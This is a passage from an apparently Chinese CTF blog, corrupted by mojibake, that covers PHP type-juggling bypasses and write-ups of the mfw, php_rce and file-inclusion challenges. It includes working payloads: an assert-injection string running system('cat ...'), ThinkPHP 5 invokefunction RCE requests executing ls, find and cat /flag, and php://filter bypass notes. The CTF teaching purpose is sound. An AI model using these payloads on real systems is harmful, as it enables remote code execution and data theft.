class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//switch()å‡½æ•°</span><br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;2abc&#x27;</span>;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//è¿™é‡Œæ˜¯å¼±æ¯”è¾ƒ</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">//åŒä¸Š</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//ç»“æœä¼šè¾“å‡º2</span><br>    <br><span class="hljs-comment">//intval()å‡½æ•°:å°†ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä¼šå°è¯•å°†å­—ç¬¦ä¸²ä¸­çš„æ•°å­—éƒ¨åˆ†æå–å‡ºæ¥å¹¶è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯æµ®ç‚¹æ•°ï¼Œå®ƒä¼šå°†æµ®ç‚¹æ•°æˆªæ–­ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯å…¶ä»–ç±»å‹çš„å€¼ï¼Œå®ƒä¼šå°è¯•å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ã€‚**è¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤äº†ï¼Œç”¨æœªä¿®å¤å‰çš„ç‰ˆæœ¬ä¸¾ä¸ªæ —å­**</span><br><span class="hljs-comment">//å®ƒä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ï¼ˆæ³¨æ„è¿™ä¸ªé€šå¸¸é…åˆpreg_matchæ¥ä½¿ç”¨ï¼‰</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$num</span>=<span class="hljs-number">2e4</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>; <span class="hljs-comment">//20000</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>);<span class="hljs-comment">//2</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&lt;<span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//è®©ä¸€ä¸ªå˜é‡intvalåå°äº2020ä½†æ˜¯åŠ ä¸€åœ¨intvalä¼šå¤§äº2021ï¼Œ2e4å°±æ˜¯ä¸€ä¸ªç†æƒ³çš„å€¼</span><br><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello world!&#x27;</span>;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//è¾“å‡ºhello world!</span><br><span class="hljs-comment">//åŒç†è¿˜å¯ä»¥ç”¨0xå¼€å¤´çš„åå…­è¿›åˆ¶ã€0å¼€å¤´çš„å…«è¿›åˆ¶è¿›è¡Œä¸€äº›ç»•è¿‡</span><br><br><span class="hljs-comment">//is_numeric() å‡½æ•°çš„ä½œç”¨æ˜¯åˆ¤æ–­ç»™å®šçš„å€¼æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å¦‚æœå€¼æ˜¯æ•°å­—æˆ–å¯ä»¥è§£æä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› trueï¼›å¦åˆ™è¿”å› falseã€‚</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">123</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123.0&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x776179</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;0x776179&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123a&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123 &#x27;</span>));<span class="hljs-comment">//flase</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//in_array()å‡½æ•°ï¼šç”¨äºæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦å­˜åœ¨äºæ•°ç»„ä¸­ã€‚</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br>å‚æ•°è¯´æ˜ï¼š<br><br>    <span class="hljs-variable">$value</span>ï¼šè¦æ£€æŸ¥çš„å€¼ã€‚<br>    <span class="hljs-variable">$array</span>ï¼šè¦æœç´¢çš„æ•°ç»„ã€‚<br>    <span class="hljs-variable">$strict</span>ï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ˜¯å¦è¿›è¡Œä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œé»˜è®¤ä¸º <span class="hljs-literal">false</span>ã€‚å¦‚æœè®¾ç½®ä¸º <span class="hljs-literal">true</span>ï¼Œåˆ™ä¸ä»…è¦æ¯”è¾ƒå€¼ï¼Œè¿˜è¦æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚<br><br>è¯¥å‡½æ•°ä¼šéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶ä¸è¦æ£€æŸ¥çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å› <span class="hljs-literal">true</span>ï¼Œå¦åˆ™è¿”å› <span class="hljs-literal">false</span>ã€‚<br>    é—®é¢˜å‡ºåœ¨<span class="hljs-variable">$strict</span>å‚æ•°ï¼Œå¼±ä¸è®¾ç½®åˆ™ä¸ºå¼±æ¯”è¾ƒï¼Œç»•è¿‡æ–¹æ³•è§ä¸Šã€‚    <br></code></pre></td></tr></table></figure><p>è¿˜åœ¨å¸ˆå‚…ä»¬çš„æ–‡ç« ä¸Šçœ‹åˆ°è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼š<code>preg_match</code>ä¸intvalé…åˆä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æŒ‰è§„å®šä¼ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸æ˜¯ä¼ ä¸€ä¸ªæ•°ç»„è¿›å»ï¼Œè¿™æ ·å°±ä¼šæŠ¥é”™</span><br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;oh you find meï¼&#x27;</span>ï¼›<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?num[]=1,ä¼ ä¸ªæ•°ç»„å¯ä»¥ç»•è¿‡dieï¼Œç„¶åIntvalæ•°ç»„ä¼šæŠ¥é”™è¿”å›1ï¼Œä»è€Œecho flagã€‚</span><br><br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„è¿˜æœ‰array_search()å‡½æ•°ï¼šç”¨äºåœ¨æ•°ç»„ä¸­æœç´¢æŒ‡å®šçš„å€¼ï¼Œå¹¶è¿”å›è¯¥å€¼å¯¹åº”çš„é”®ï¼ˆå³æ•°ç»„ä¸­çš„ç´¢å¼•ä½ç½®ï¼‰ã€‚è¯­æ³•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    $valueï¼šè¦æœç´¢çš„å€¼ã€‚</span><br><span class="hljs-comment">    $arrayï¼šè¦æœç´¢çš„æ•°ç»„ã€‚</span><br><span class="hljs-comment">    $strictï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ˜¯å¦è¿›è¡Œä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œé»˜è®¤ä¸º falseã€‚å¦‚æœè®¾ç½®ä¸º trueï¼Œåˆ™ä¸ä»…è¦æ¯”è¾ƒå€¼ï¼Œè¿˜è¦æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è¯¥å‡½æ•°ä¼šéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶ä¸è¦æœç´¢çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å›è¯¥å€¼å¯¹åº”çš„é”®ï¼›å¦‚æœæ‰¾ä¸åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>â€‹    è¿™ä¸ªå‡½æ•°çš„ä¾‹é¢˜å¯ä»¥å‚è€ƒæ”»é˜²ä¸–ç•Œä¸­çš„easyphpã€‚</p><p>å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_47804678/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">128814377</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_48108919/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">123279251</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>c53f7af34ee2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
    <url>/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    
    <content type="html"><![CDATA[<p>åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>è¿›å…¥ç¯å¢ƒ:<br><img src="/img/b5.png" alt="b5"><br>ç‚¹ä¸‹ä¸Šé¢çš„é“¾æ¥çœ‹çœ‹ç»“æœAboutï¼š<br><img src="/img/b6.png" alt="b6"><br>é‡Œé¢æœ‰ä¸ªGit,æƒ³åˆ°äº†Gitæ³„éœ²,ç›´æ¥çœ‹ä¸‹.gitæ–‡ä»¶æœ‰æ²¡æœ‰ï¼š<br><img src="/img/b7.png" alt="b7"><br>ä¸ŠGitHackï¼š<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" alt="b8"><br>è®¿é—®ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰å•¥å¥½ä¸œè¥¿ï¼š<br>flag.phpé‡Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œå¯æƒœï¼š<br><img src="/img/b9.png" alt="b9"><br>çœ‹ä¸‹index.php,é‡Œé¢æœ‰ä¸å°‘å¥½ä¸œè¥¿ï¼ŒæŠŠæœ‰ç”¨çš„phpéƒ¨åˆ†æ‹¿å‡ºæ¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆGETæ–¹å¼ä¼ pageï¼Œä¸ç»™pageèµ‹å€¼çš„è¯è‡ªåŠ¨ç­‰äºhome(å°±æ˜¯æˆ‘ä»¬è¿›å»çœ‹åˆ°çš„é¦–é¡µ)ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªæ‹¼æ¥ï¼štemplates&#x2F;$page.phpï¼ŒæŠŠè¿™ä¸œè¥¿ç»™$fileã€‚assertè¿™ä¸œè¥¿å«â€œæ–­è¨€æ£€æŸ¥â€ï¼Œæ„æ€æ˜¯å¦‚æœé‡Œé¢çš„æ¡ä»¶æ˜¯çœŸï¼Œå°±ä¼šæ¥ç€æ‰§è¡Œåé¢çš„å‡½æ•°require_onceï¼Œè¿™ä¸œè¥¿æœ‰ç‚¹ç‚¹åƒincludeåŒ…å«ï¼Œè‡³äºç›´æ¥åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œä¸ç”¨ä¼ªåè®®å•¥çš„æˆ‘ä¸€ç›´æŠŠå®ƒç†è§£æˆæ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œå“ˆå“ˆã€‚<br>æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ„é€ pageè®©ä»–æ‰§è¡Œä¸€äº›å‘½ä»¤æ¯”å¦‚â€™lsâ€™ â€˜catâ€™å•¥çš„ã€‚<br>æ¥ä¸‹æ¥çš„payloadå‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼ï¼š<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¦ç»™pageèµ‹è¿™ä¹ˆä¸€ä¸ªå€¼ï¼Œå…ˆçœ‹è¿™ä¸ªpageè®©fileæˆäº†ä¸ªå•¥ä¸œè¥¿ï¼š<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>å¸¦åˆ°æ–­è¨€å‡½æ•°ä¸­ï¼š<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p><p>strposå‡½æ•°æ˜¯çœ‹å‚æ•°é‡Œæœ‰æ²¡æœ‰è¦æ£€æµ‹çš„å€¼ï¼Œæœ‰çš„è¯è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ²¡æœ‰å°±è¿”å›falseã€‚æ˜æ˜¾ â€˜template&#x2F;flagâ€™è¿™é‡Œé¢æ²¡abcï¼Œç¬¬ä¸€ä¸ªassertä¸ºçœŸï¼›ç¬¬äºŒä¸ªæ‰§è¡Œ cat templates&#x2F;flag.php ï¼Œè¿™æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯å»æ‹¿æˆ‘ä»¬è¦çš„flagï¼Œä¸è¿‡æ³¨æ„catåçš„æ–‡ä»¶è·¯å¾„ã€‚æˆ‘ä»¬å½“å‰åœ¨index.phpä¸‹ï¼Œindex.phpå’ŒtemplatesåŒç›®å½•ï¼Œflag.phpåˆåœ¨templatesä¸‹ã€‚æ‰€ä»¥ç›¸å¯¹è·¯å¾„å°±æ˜¯<code>templates/flag.php</code>ã€‚æœ€åä¸€ä¸ªæ–­è¨€æ˜¯æ‰¾flag.phpä¸­æœ‰æ²¡æœ‰ä¿©ç‚¹ï¼Œæ²¡æœ‰è¿”å›falseã€‚å› ä¸ºæ˜¯ä¸¤ä¸ªandè¿æ¥ï¼Œä¸‰ä¸ªæ¡ä»¶éƒ½ä¸ºçœŸå³ä¸ºçœŸã€‚ç„¶åç›´æ¥require($file)ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚<br>flagè—åœ¨æºç é‡Œï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" alt="image"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>è¿›å…¥ç¯å¢ƒï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" alt="image"><br>Githubæœä¸‹æœ‰å…³è¿™ä¸ªThinkPHPV5çš„ç›¸å…³æ¼æ´ï¼Œå‘ç°æœ‰ä¸€å¤§å †è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„POCï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" alt="image"><br>æ‰¾ä¸ªé•¿çš„è¯•è¯•ï¼š<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>æ‰§è¡Œäº†phpinfo()è¿™ä¸ªå‘½ä»¤<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" alt="image"><br>lsçœ‹ä¸‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" alt="image"><br>æ²¡æœ‰å’Œflagæœ‰å…³çš„ä¸œè¥¿ï¼Œç­‰ä¼šç”¨findæ‰¾ä¸€ä¸‹ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸ªå’Œçˆ¬è™«æœ‰å…³çš„robots.txtï¼Œè®©æˆ‘çœ‹çœ‹ä½ ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" alt="image"><br>å¯æƒœå•¥ä¹Ÿæ²¡æœ‰ï¼Œfindå‘½ä»¤æ‰¾ä¸‹å’Œflagæœ‰å…³çš„ä¸œè¥¿ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>findæ˜¯å…¨ç£ç›˜æŸ¥æ‰¾æ‰€ä»¥å¯èƒ½ä¼šæ¯”è¾ƒæ…¢ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" alt="image"><br>è‰äº†ï¼Œè¿˜æ˜¯çœ‹çœ‹æ ¹ç›®å½•ä¸‹éƒ½å•¥ä¸œè¥¿å§ï¼š<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" alt="image"><br>æœ‰ä¸ªflag: ls &#x2F;flagæ²¡å•¥æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œç›´æ¥ cat &#x2F;flagè¯»ä¸€ä¸‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" alt="image"></p><h2 id="é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«"><a href="#é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«" class="headerlink" title="é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«"></a><strong>é¢˜ç›®åç§°-æ–‡ä»¶åŒ…å«</strong></h2><h2 id="è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag-phpæºç ï¼šå›æ˜¾äº†dont-hackï¼ä¼°è®¡check-phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag-phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag-phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag-phpæºç ï¼šå›æ˜¾äº†dont-hackï¼ä¼°è®¡check-phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç 